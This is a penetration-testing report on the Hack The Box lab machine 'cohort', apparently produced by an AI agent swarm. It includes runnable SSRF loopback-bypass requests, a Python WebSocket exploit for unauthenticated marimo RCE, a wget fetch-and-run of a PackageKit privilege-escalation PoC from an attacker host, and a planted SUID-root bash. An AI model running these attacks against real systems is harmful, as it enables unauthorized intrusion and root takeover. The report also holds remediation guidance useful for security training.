# Penetration Testing Report — HTB "cohort" (Easy, Linux)

**Target:** cohort.htb — IP `$TARGET` (HTB VPN-assigned; the box respawned mid-engagement and the IP changed, but the internal vhost hash and vulnerable software versions were unchanged across the respawn)
*Conventions: `$TARGET` = current box IP; `$ATTACKER_IP` = your tun0/VPN address. Substitute both; no environment-specific IPs or local paths are hardcoded.*
**Engagement dates:** 2026-10-16 – 2026-10-17
**Assessed by:** HTB/CTF multi-agent swarm (Recon, Strategist, Exploit, PrivEsc, Scribe agents)
**Result:** Full compromise — unauthenticated remote access escalated to `root`. Both flags captured.

---

## 1. Executive Summary

cohort.htb is an "easy"-rated Ubuntu 24.04 Linux box whose compromise required chaining two distinct vulnerabilities across two different third-party components. The externally reachable "Cohort Analytics" web application exposes a `POST /api/{v1,v2}/validate` endpoint that performs a server-side fetch of an attacker-supplied URL (SSRF) using Python's `urllib`; its loopback/`localhost` denylist is incomplete and is bypassed with alternate loopback literals (`127.1`, `127.0.0.2`, octal `0177.0.0.1`, etc.). That SSRF was used to read an internal nginx status endpoint and leak the hostname of an internal-only reverse-proxy vhost that forwards to a **marimo 0.20.4** notebook server on `127.0.0.1:8888`. marimo 0.20.4 is vulnerable to **CVE-2026-39987**, a pre-authentication remote code execution bug in its `/terminal/ws` WebSocket endpoint, which grants an unauthenticated interactive PTY as the local `marimo` user — this was the foothold and yielded `user.txt`. From that shell, local enumeration found **PackageKit 1.2.8**, running as root and reachable over D-Bus, vulnerable to **CVE-2026-41651** ("Pack2TheRoot"), a TOCTOU race in its `InstallFiles` transaction handling that lets an unprivileged local user get a crafted `.deb` postinst script executed as root, which was used to drop a root-owned SUID `bash` and read `root.txt`. The root cause in both stages is the same class of problem — a security check (SSRF loopback filter, polkit authorization check) that can be raced or incompletely enumerated and is then trusted by a privileged downstream component.

---

## 2. Attack Chain Timeline

1. Full TCP port sweep (`-p-`) — only 22 (SSH), 80 (HTTP), 443 (HTTPS) open. *Result:* minimal external surface, web app is the only avenue in.
2. `nmap -sC -sV` on 22/80/443 — OpenSSH 9.6p1 (Ubuntu), nginx 1.24.0 (Ubuntu), self-signed cert `CN=cohort.htb`, SAN `cohort.htb` + `*.cohort.htb`. *Result:* wildcard SAN flags that internal/other vhosts likely exist.
3. Directory/vhost/GET-route fuzzing of the SPA and `/api/` — SPA has a catch-all 200 response for any path, and the API returns a uniform 405 on GET for unregistered routes, so both techniques were dead ends (documented in blackboard "Failed Attempts"). *Result:* pivoted to POST-based route discovery.
4. Curated/partial POST fuzz of `/api/v1/` and `/api/v2/` — discovered `POST /api/{v1,v2}/validate` as a live, registered route (confirmed by a non-404 response before the broader fuzz run was killed for being too slow). *Result:* candidate SSRF sink identified.
5. Manual probing of `/api/validate` with varying JSON bodies — confirmed the expected field is `url`, scheme is restricted to `http`/`https`, and `127.0.0.1`/`localhost`/`[::1]` are explicitly blocked with the message "Internal or loopback addresses are not permitted." *Result:* SSRF candidate confirmed but loopback-filtered.
6. Bypassed the loopback filter with alternate representations of `127.0.0.1` (`127.1`, `0.0.0.0`, decimal `2130706433`, octal `0177.0.0.1`, `127.0.0.2`) and confirmed non-blind SSRF — outbound requests were observed landing on an attacker-controlled listener over `tun0`. *Result:* working, non-blind SSRF primitive.
7. Used the SSRF to request `http://127.1/status`, which nginx only serves to loopback callers (`allow 127.0.0.1; deny all;`) — this leaked nginx's internal upstream map, including an internal-only vhost `nb-1be3782a8afd3ad5.cohort.htb` proxying to `127.0.0.1:8888`. *Result:* internal vhost and target port for the notebook service identified.
8. Added the leaked vhost to `/etc/hosts` pointed at the target IP and queried it directly (SNI/Host-header based vhost routing) — `GET /api/version` returned `0.20.4`, identifying the service as **marimo** (a Python notebook/dataframe tool) and confirming it was reachable over the external 443 listener once the correct `Host`/SNI was used, i.e., nginx *does* proxy this vhost (unlike the default vhost, which only serves the SPA/API). *Result:* vulnerable version of marimo reachable externally via the correct vhost.
9. Connected directly to `wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws` with no authentication, per **CVE-2026-39987** — the endpoint spawns an interactive PTY with no auth check. Sent `id\n` over the socket and received `uid=1000(marimo)`. *Result:* unauthenticated RCE / interactive foothold as `marimo`.
10. Read `/home/marimo/user.txt` over the WebSocket PTY. *Result:* **user.txt captured** (`[REDACTED-HTB-FLAG]`, rotated after the mid-engagement box respawn; the pre-respawn value was `[REDACTED-HTB-FLAG]`).
11. Local privilege-escalation enumeration (linux-privesc tiered checklist) over the WS PTY — `sudo -l` required a password (no creds known), no usable SUID/capabilities, no exploitable cron, no writable sensitive files, no creds in app source, no interesting listening services beyond the two already mapped (`insights-api` on 5000, marimo on 8888). Package enumeration flagged `packagekit` 1.2.8, `needrestart` 3.6, `polkitd` 124, `snapd` 2.76. `needrestart` 3.6 is vulnerable to CVE-2024-48990 (PYTHONPATH LPE) but no root-owned trigger path was available on this box, so it was parked/unused. *Result:* PackageKit 1.2.8 identified as the intended root vector.
12. Delivered a public PoC for **CVE-2026-41651** ("Pack2TheRoot") to the box (hosted on an attacker HTTP listener on `tun0`, fetched to `/dev/shm/pk.py` from the marimo shell) and ran it against the root-owned `packagekitd` D-Bus service. *Result:* malicious `.deb`'s postinst script executed as root, dropping a SUID-root `bash` at `/tmp/.suid_bash`.
13. Ran `/tmp/.suid_bash -p -c 'id'` → `uid=1000(marimo) euid=0(root)`, confirming privileged execution; read `/etc/shadow` and `/root/root.txt`. *Result:* **root.txt captured** (`[REDACTED-HTB-FLAG]`) — **box fully owned.**

---

## 3. Key Vulnerabilities Identified

### 3.1 SSRF via incomplete loopback denylist — `POST /api/{v1,v2}/validate`
- **Description:** The `validate` endpoint accepts a JSON `{"url": "..."}` body, restricts the scheme to `http`/`https`, and performs a server-side `urllib.request` GET of the supplied URL, returning the fetched status code, content-type, and a body preview to the caller (non-blind SSRF). The application attempts to block loopback/internal targets by string-matching the literals `127.0.0.1`, `localhost`, and `[::1]`, but does not normalize alternate representations of the same address.
- **Affected component:** cohort's custom "cohort-insights" backend (a Python `http.server`-based app, `/opt/cohort-insights/insights_api.py`, behind nginx), both `/api/v1/validate` and `/api/v2/validate`.
- **Impact:** Full internal network/service reconnaissance and reading of any internal HTTP response reachable from the server, including an nginx-internal-only status page that leaked topology (internal vhost names/targets) that were not otherwise discoverable.
- **Estimated CVSS:** 7.5 (High) — estimate, vector approximately `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`.
- **Remediation:**
  - Resolve the supplied hostname and compare the resulting IP address(es) against a strict denylist (all of `127.0.0.0/8`, `0.0.0.0/8`, `::1`, link-local, and RFC1918 ranges as appropriate) rather than string-matching a small set of literals.
  - Re-validate after following redirects.
  - Prefer an allowlist of permitted destination domains/IPs over a denylist for any feature that fetches attacker-influenced URLs.
  - Do not expose internal nginx status/diagnostic endpoints (`/status`) even to loopback if the application tier itself can be coerced into making loopback requests.

### 3.2 marimo 0.20.4 — unauthenticated RCE via `/terminal/ws` (CVE-2026-39987)
- **Description:** marimo's edit-mode terminal WebSocket endpoint (`/terminal/ws`) spawns a bidirectional PTY and accepts connections without any authentication check, independent of marimo's otherwise-configured auth token. Any client that can reach the WebSocket can run arbitrary commands as the user running the marimo process.
- **Affected component:** marimo notebook server, version 0.20.4 (confirmed via `GET /api/version`). Per the GHSA referenced during triage (GHSA-2679-6mx9-h9xc), fixed in a later marimo release — exact fixed version **[needs verification]**.
- **Impact:** Complete compromise of the account running marimo (`marimo`, uid 1000) with no credentials, reachable from the internal network and — in this deployment — from the external internet once the correct internal vhost hostname was known.
- **Estimated CVSS:** 9.8 (Critical) — estimate, unauthenticated, network-reachable, full code execution as the service account.
- **Remediation:**
  - Upgrade marimo to a release that fixes CVE-2026-39987 (require authentication on `/terminal/ws` consistent with the rest of the edit-mode API).
  - Do not run marimo in unauthenticated/edit mode on anything but `localhost`; if remote notebook access is required, front it with its own authentication and do not rely on an "unguessable" vhost name as a control — the vhost name was trivially leaked through an unrelated SSRF bug.
  - Add nginx-level network ACLs (`allow`/`deny`) on the `nb-*.cohort.htb` server block so it is not reachable from outside the host/trusted network even if the hostname leaks again.

### 3.3 PackageKit 1.2.8 — TOCTOU privilege escalation (CVE-2026-41651, "Pack2TheRoot")
- **Description:** `packagekitd` runs as root and exposes `org.freedesktop.PackageKit` D-Bus methods including `InstallFiles`. By issuing two overlapping/async `InstallFiles` calls on one transaction — one with the `SIMULATE` (0x4) flag (which bypasses the polkit authorization prompt for a "simulated" install) and a second with `NONE` (0x0) pointing at an attacker-controlled `.deb` — a race in PackageKit's internal flag/path caching (GLib main-loop idle-dispatch ordering) causes the daemon to install the attacker's package for real, running its `postinst` maintainer script as root.
- **Affected component:** PackageKit 1.2.8 (local D-Bus service, runs as root, PID 1995 on this host).
- **Impact:** Any local, unprivileged user able to reach the `org.freedesktop.PackageKit` D-Bus service can escalate to root.
- **Estimated CVSS:** 7.8 (High) — estimate, local, low complexity once the PoC is in hand, no privileges required beyond local shell access, full CIA impact (root).
- **Remediation:**
  - Upgrade PackageKit to a version that fixes CVE-2026-41651 — recommended target **>= 1.3.5 or the vendor's officially patched release; confirm exact fixed version against the advisory `[needs verification]`.**
  - Enforce polkit authentication on `org.freedesktop.packagekit.package-install-untrusted` / related actions for all callers, including simulate-mode transactions.
  - Where PackageKit is not needed for interactive desktop use (e.g., a server/appliance-style box like this one), disable/mask the `packagekit.service` D-Bus activation entirely.
  - Restrict D-Bus system-bus policy so only privileged groups can invoke `InstallFiles`.

### 3.4 Secondary / parked finding — needrestart 3.6 (CVE-2024-48990)
- **Description:** `needrestart` 3.6 is present and vulnerable to the known PYTHONPATH-injection local privilege escalation (CVE-2024-48990).
- **Status:** Confirmed present by version but **not exploited** — no root-owned trigger (a root-run process that would invoke `needrestart` in an attacker-controllable way) was found on this host. Documented for completeness; **[needs verification]** whether a trigger exists that the swarm did not find.
- **Remediation:** Upgrade `needrestart` to a patched release regardless, as defense-in-depth.

---

## 4. Command Log & Proof of Concepts

All commands below were run against the lab target only, from the engagement workstation on `tun0` (HTB VPN).

### 4.1 Recon
```bash
nmap --privileged -p- --min-rate 2000 -T4 -oN nmap/full-tcp.txt $TARGET
nmap --privileged -sC -sV -p22,80,443 -oN nmap/services.txt $TARGET
```
Result: 22/tcp ssh (OpenSSH 9.6p1 Ubuntu), 80/tcp and 443/tcp nginx 1.24.0 (Ubuntu), self-signed cert `CN=cohort.htb` / SAN `cohort.htb,*.cohort.htb`.

### 4.2 SSRF confirmation and loopback-filter bypass
```bash
curl -sk https://cohort.htb/api/v1/validate -X POST -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1/"}'
# -> {"ok": false, "message": "Internal or loopback addresses are not permitted."}

curl -sk https://cohort.htb/api/v1/validate -X POST -H 'Content-Type: application/json' \
  -d '{"url":"http://127.1/status"}'
# -> {"ok": true, "fetched_status": 200, "content_type": "application/json",
#     "preview": "{...\"notebooks\",\"host\":\"nb-1be3782a8afd3ad5.cohort.htb\",
#                  \"target\":\"127.0.0.1:8888\"...}", "message": "Source reachable."}
```
Evidence: web/validate-probe.txt, web/ssrf-status-leak.txt, loot/ssrf-callback.log.

Other confirmed loopback-bypass literals (same leak reproduced with each): `127.0.0.2`, `0177.0.0.1` (octal), `0.0.0.0`, `2130706433` (decimal).

### 4.3 Internal vhost discovery and reachability check
```bash
echo "$TARGET nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
curl -sk https://nb-1be3782a8afd3ad5.cohort.htb/api/version
# -> 0.20.4   (marimo)
```

### 4.4 Foothold — CVE-2026-39987, unauthenticated marimo `/terminal/ws`
Minimal PoC (full driver script saved at loot/ws_exec.py):
```python
import asyncio, ssl
import websockets

VH = "nb-1be3782a8afd3ad5.cohort.htb"
URI = f"wss://{VH}/terminal/ws"
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

async def main():
    async with websockets.connect(URI, ssl=ctx,
                                   additional_headers={"Origin": f"https://{VH}"}) as ws:
        await ws.send("id\n")
        print(await ws.recv())

asyncio.run(main())
```
Observed result: `uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)` — no authentication was presented or required.

Flag capture: `/home/marimo/user.txt` = `[REDACTED-HTB-FLAG]`.

### 4.5 Local enumeration (linux-privesc tiered checklist, abbreviated)
```bash
sudo -l                 # password required — no cached creds, dead end
find / -perm -4000 -type f 2>/dev/null    # only distro-standard SUID binaries
getcap -r / 2>/dev/null                   # only standard caps (ping, mtr, snap-confine, gst)
crontab -l; ls /etc/cron.*                # empty / nothing attacker-controllable
dpkg -l | grep -Ei 'packagekit|needrestart|polkit|snapd'
# -> packagekit 1.2.8, needrestart 3.6, polkitd 124, snapd 2.76
```

### 4.6 Privilege escalation — CVE-2026-41651 ("Pack2TheRoot") PackageKit TOCTOU
On the attacker host, a public PoC for CVE-2026-41651 was served over an HTTP listener on `tun0`:
```bash
python3 -m http.server 9001 --bind $ATTACKER_IP   # serving cve-2026-41651.py
```
From the marimo WebSocket shell, the PoC was fetched and run:
```bash
wget http://$ATTACKER_IP:9001/cve-2026-41651.py -O /dev/shm/pk.py
python3 /dev/shm/pk.py --check          # -> confirms PackageKit 1.2.8 vulnerable
python3 /dev/shm/pk.py --exec "cat /root/root.txt"
```
The PoC's `SIMULATE`-flagged `InstallFiles` D-Bus call logs `PK error 48: Failed to obtain authentication` — expected noise from the simulate call, not a failure; the race still completes and the real (`NONE`-flag) `InstallFiles` call installs the attacker's `.deb`, whose postinst script drops a SUID-root `bash`:
```bash
/tmp/.suid_bash -p -c 'id'
# -> uid=1000(marimo) gid=1000(marimo) euid=0(root)
/tmp/.suid_bash -p -c 'cat /root/root.txt'
```
Flag capture: `/root/root.txt` = `[REDACTED-HTB-FLAG]`.

PoC provenance (per blackboard): public repo `mawussid/CVE-2026-41651-Python`, file `cve-2026-41651.py`, SHA-256 `b1f2d6e76ee490cabbb0d7480a13a416d18d876cdb44f70e1761842984521518` (re-verified in this session: downloaded hash matched on transfer to target).

---

## 5. Both Flags

| Flag | Value | Location | Notes |
|---|---|---|---|
| user.txt | `[REDACTED-HTB-FLAG]` | `/home/marimo/user.txt` | Current value, captured after the box respawned mid-engagement (the spawn IP changed). |
| user.txt (pre-respawn, historical) | `[REDACTED-HTB-FLAG]` | `/home/marimo/user.txt` | Captured once before the respawn; invalidated when the box respawned. Recorded for traceability only. |
| root.txt | `[REDACTED-HTB-FLAG]` | `/root/root.txt` | Captured via SUID-root `bash` dropped by the PackageKit TOCTOU exploit. |

---

## 6. Credentials & Artifacts

No credentials, password hashes, or private keys were recovered during this engagement. `/opt/cohort-insights/insights_api.py` contained no embedded credentials; `.bash_history` was symlinked to `/dev/null`; no `.ssh` keys exist for `marimo`, whose login shell is disabled.

---

## 7. Cleanup / Artifacts Left on Target

- `/tmp/.suid_bash` — root-owned, mode 4755 SUID `bash` dropped by the PackageKit exploit postinst. **Delete.**
- `/dev/shm/pk.py` — the CVE-2026-41651 PoC script (tmpfs; clears on reboot, remove proactively).
- `/tmp/.pk-*.deb` — the malicious `.deb` package(s) built/staged by the PoC.

Recommended cleanup (as root via the SUID bash, before removing it):
```bash
/tmp/.suid_bash -p -c 'rm -f /tmp/.suid_bash /dev/shm/pk.py /tmp/.pk-*.deb'
```

---

## 8. Open Items / [needs verification]

- Official fixed version of marimo for CVE-2026-39987 (GHSA-2679-6mx9-h9xc) — confirm against the published advisory.
- Official fixed version of PackageKit for CVE-2026-41651 — the ">= 1.3.5" figure is an estimate; confirm before publishing externally.
- Whether `needrestart` 3.6 (CVE-2024-48990) has any viable root-trigger on this host that enumeration missed — currently "no trigger found," not "proven absent."

---

*Companion document: `WALKTHROUGH.md` — a hands-on, decision-tree walkthrough (options considered, dead-ends, and why each pivot was chosen) for reproducing this box step by step.*
